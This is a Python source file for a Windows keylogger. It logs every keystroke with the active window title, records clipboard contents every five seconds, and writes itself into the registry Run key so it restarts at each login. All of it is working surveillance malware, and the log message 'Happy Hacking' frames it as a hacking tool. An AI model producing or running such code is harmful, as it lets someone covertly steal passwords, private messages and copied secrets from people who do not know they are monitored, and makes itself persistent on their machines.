from pynput.keyboard import Key, Listener
import logging
import os
import win32gui
import platform
import pyperclip
import time
import sys
import threading

def get_window_title(): #log active windows title

    try:
        if platform.system() == "Windows":
            window = win32gui.GetForegroundWindow()
            return win32gui.GetWindowText(window)
        else:
            return 'OS is not Windows'
    except Exception as e:
        logging.error(f'Error getting window title: {str(e)}')
        return "Error"
    
def clipboard_monitor(): #Monitor clipboard changers

    last_clipbpoard = ""
    while True:
        time.sleep(5)
        try:
            current_clipboard = pyperclip.paste()
            if current_clipboard != last_clipbpoard and current_clipboard:
                logging.info(f'Clipboard Content: {current_clipboard}')
                last_clipboard = current_clipboard
        except Exception as e:
            logging.error(f'Error monitoring clipboard: {str(e)}')

def make_startup_script(): #creating windows registery key

    try:
        if platform.system() == "Windows":
            import winreg
            script_path = os.path.abspath(__file__)
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "Keylogger", 0, winreg.REG_SZ, f'"{sys.executable}" "{script_path}"')
            winreg.CloseKey(key)
            logging.debug("Added to Windows startup")
        else:
            logging.warning("Startup script not supported on this OS")
    except Exception as e:
        logging.error(f'Error setting up startup: {str(e)}')


def on_press(key): #log pressed key

    try:#check special keys
        window_title = get_window_title()
        if hasattr(key, 'char') and key.char is not None:
            logging.info(f'Window: {window_title} | Key Released: {key.char}')
        
        else:
            #convert spcial keys to readable format
            key = str(key).replace("Key.", "").upper()
            logging.info(f'Window: {window_title} | Key Released: {key}')  
    
    except Exception as e:
        logging.error(f'Error in on_press: {str(e)}')


def on_release(key): #log released key

    try:
        window_title = get_window_title()
        if hasattr(key, 'char') and key.char is not None:
            logging.info(f'Window: {window_title} | Key Released: {key.char}')
        
        else:
            key = str(key).replace("Key.", "").upper()
            logging.info(f'Window: {window_title} | Key Released: {key}') 

        if key == 'ESC':
            logging.debug('Keylogger Stopped.')
            return False

    except Exception as e:
        logging.error(f'Error in on_release: {str(e)}')

#start listner
def main(log_file_path = 'keylogger.log'):
    log_dir = os.getcwd() #current working directory
    log_file = os.path.join(log_dir, log_file_path)
    logging.basicConfig(
        level=logging.DEBUG, #all log levels
        format='%(asctime)s - %(levelname)s - %(message)s',
        filename=log_file #creating file
    )
    make_startup_script()

    clipboard_thread = threading.Thread(target=clipboard_monitor, daemon=True)
    clipboard_thread.start()

    logging.debug('Keylogger Started...Happy Hacking')
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == '__main__':
    main()